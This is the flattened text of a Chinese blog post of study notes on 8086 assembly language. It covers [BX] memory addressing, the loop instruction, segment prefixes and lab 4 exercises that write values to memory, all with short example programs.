可以表示 mov ax,[1]、mov ax,[2]等 5.1 [BX]5.2 LoopCPU执行loop指令时，要进行两步操作： (cx)=(cx)-1 判断cx中的值，不为零则转至标号处执行程序，为零则向下执行 以计算2^12的值为例进行分析 1234567891011assume cs:codecode segment mov ax,2 mov cx,11s: add ax,ax loop s mov ax,4c00h int 21hcode endsend 代码中有一个标号s，实际上它标识了一个地址，该地址处有一条指令： add ax,ax 用cx和loop指令配合实现循环功能的程序框架如下： 1234mov cx,循环次数s: 循环执行的程序段 loop s 5.4 Debug和汇编编译器masm对指令的不同处理对于如下指令，debug和masm有不同的处理： 1mov ax,[0] debug中表示将ds:0的数据送入ax中 masm则将其当作指令 “mov ax,0”处理 那么如何在源程序中将ds:0的内存送入al中？ 将偏移地址送入bx中，用[bx]的方式访问内存单元（比较麻烦） 在”[]”前显式给出地址所在的段寄存器，如访问2000：0单元： 123mov ax,2000hmov ds,axmov al,ds:[0] 5.5 loop和[bx]的联合应用在实际中，需要用循环处理地址连续的内存单元中的数据的问题，此时可应用“mov al,[bx]”，通过改变bx中的数值，改变访问的内存单元 5.6 段前缀可以在访问内存单元的指令中显式地给出内存单元的段地址所在的段寄存器，如 1234mov ax,ds:[bx] 或mov ax,cs:[bx] 或mov ax,ss:[bx]... 5.7 一段安全的空间在不能确定一段内存空间是否存放着重要的数据或代码时，不能随意向其中写入内容 DOS方式下，一般情况，0:200~0:2ff这段空间没有系统或其他程序的数据或代码 5.8 段前缀的使用附：实验4 [bx]和loop的使用 编程，向内存0:200~0:23f依次传送数据0~63(3FH) 12345678910111213141516ASSUME CS:CODECODE segment mov ax,0 mov ds,ax mov cx,64 mov bx,200hs: mov [bx],ax inc ax inc bx loop s mov ax,4c00h int 21hcode endsend 编程，向内存0:200~0:23f依次传送数据0~63(3FH)，程序中只能使用9条指令，9条指令中包括”mov ax,4c00h”和”int 21h” 123456789101112131415ASSUME CS:CODECODE segment mov ax,20 mov ds,ax mov cx,63 mov bx,0hs: mov [bx],bx inc bx loop s mov ax,4c00h int 21hcode endsend 下面程序的功能是将 “mov ax,4c00h”之前的指令复制到内存 12345678910111213141516ASSUME CS:CODEcode segment mov ax,CS mov ds,ax mov ax,0020h mov es,ax mov bx,0 mov cx,17hs: mov al,[bx] mov es:[bx],al inc bx loop s mov ax,4c00h int 21hcode endsend （17h是先设定一个值，到debug中看内存中程序的长度才得到的） 如有错误，还望指正","link":"/2022/01/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%883%EF%BC%89-BX-%E5%92%8Cloop%E6%8C%87%E4%BB%A4/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"RE","slug":"RE","link":"/tags/RE/"},{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"re","slug":"re","link":"/tags/re/"},{"name":"Crypto","slug":"Crypto","link":"/tags/Crypto/"},{"name":"预备知识","slug":"预备知识","link":"/tags/%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/"},{"name":"参考资料","slug":"参考资料","link":"/tags/%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99/"},{"name":"汇编语言","slug":"汇编语言","link":"/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"}],"categories":[]}